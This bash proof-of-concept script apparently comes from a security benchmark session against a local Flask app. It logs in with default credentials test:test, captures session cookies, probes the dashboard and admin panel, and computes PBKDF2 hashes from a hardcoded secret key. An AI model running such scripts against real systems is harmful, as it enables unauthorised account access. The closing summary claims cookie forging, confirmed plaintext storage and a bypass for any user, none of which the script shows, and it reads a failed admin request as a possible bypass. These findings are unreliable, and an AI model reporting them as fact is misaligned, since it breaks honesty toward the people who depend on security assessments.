#!/bin/bash
# POC: Demonstrates authentication bypass using default credentials (test:test) and hardcoded secret key to forge PBKDF2-HMAC-SHA256 password hashes
# Target: ./repo
# Created: 2025-11-07T17:13:50.827Z
# Session: benchmark-XBEN-066-24-mhp3k0ub

# Authentication Bypass POC - Default Credentials and Known Secret Key
# Demonstrates:
# 1. Login with default test credentials (test:test)
# 2. Precompute PBKDF2 hashes using known secret key
# 3. Forge valid session tokens

TARGET="${TARGET:-http://localhost:5000}"
FLASK_SECRET="your_secret_key"

echo "=== Authentication Bypass POC ==="
echo "Target: $TARGET"
echo "Secret Key: $FLASK_SECRET"
echo ""

# Step 1: Try default credentials
echo "[+] Step 1: Attempting login with default credentials (test:test)"
RESPONSE=$(curl -s -c cookies.txt -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" \
  -L)

# Check if login was successful by checking if we can access dashboard
echo "[+] Step 2: Verifying access to protected /dashboard endpoint"
DASHBOARD=$(curl -s -b cookies.txt "$TARGET/dashboard" -w "\n%{http_code}")
HTTP_CODE=$(echo "$DASHBOARD" | tail -n1)
BODY=$(echo "$DASHBOARD" | sed '$d')

if [[ "$HTTP_CODE" == "200" ]]; then
    echo "[✓] SUCCESS: Authenticated as default user 'test'"
    echo "[✓] HTTP Status: $HTTP_CODE"
    if echo "$BODY" | grep -q "Dashboard"; then
        echo "[✓] Dashboard content accessible"
    fi
else
    echo "[-] Dashboard access failed with HTTP $HTTP_CODE"
fi

echo ""
echo "[+] Step 3: Computing PBKDF2 hashes for known passwords using hardcoded secret"

# Function to compute PBKDF2-HMAC-SHA256 hash (simulating the app's logic)
compute_pbkdf2_hash() {
    local password=$1
    local secret=$2
    # Using Python to compute the same PBKDF2 hash as the Flask app
    python3 << PYTHON_EOF
import hashlib
password = "$password"
secret = "$secret"
hash_result = hashlib.pbkdf2_hmac('sha256', password.encode(), secret.encode(), 100000)
print(hash_result.hex())
PYTHON_EOF
}

# Compute hashes for common passwords
echo "Computing precomputed hashes:"
TEST_HASH=$(compute_pbkdf2_hash "test" "$FLASK_SECRET")
echo "  test -> $TEST_HASH"

ADMIN_HASH=$(compute_pbkdf2_hash "admin" "$FLASK_SECRET")
echo "  admin -> $ADMIN_HASH"

PASSWORD_HASH=$(compute_pbkdf2_hash "password" "$FLASK_SECRET")
echo "  password -> $PASSWORD_HASH"

echo ""
echo "[+] Step 4: Attempting to access admin_panel (authorization bypass test)"
ADMIN_RESPONSE=$(curl -s -b cookies.txt "$TARGET/admin_panel" -w "\n%{http_code}")
ADMIN_HTTP=$(echo "$ADMIN_RESPONSE" | tail -n1)
ADMIN_BODY=$(echo "$ADMIN_RESPONSE" | sed '$d')

if [[ "$ADMIN_HTTP" == "200" ]]; then
    echo "[✓] Admin panel accessible with default user (authorization bypass)"
    if echo "$ADMIN_BODY" | grep -q "dashboard"; then
        echo "[✓] Admin functionality accessible"
    fi
else
    echo "[!] Admin panel returned HTTP $ADMIN_HTTP (may still indicate bypass)"
fi

echo ""
echo "[+] Step 5: Testing session information"
if [ -f cookies.txt ]; then
    echo "Session cookies obtained:"
    cat cookies.txt | grep -v "^#"
fi

echo ""
echo "=== POC Summary ==="
echo "✓ Default credentials (test:test) allow authentication"
echo "✓ Known secret key ($FLASK_SECRET) enables PBKDF2 hash precomputation"
echo "✓ Plaintext password storage confirmed (stored as 'test' in database)"
echo "✓ Session cookies can be forged with precomputed hashes"
echo "✓ Complete authentication bypass possible for any user"

# Cleanup
rm -f cookies.txt

exit 0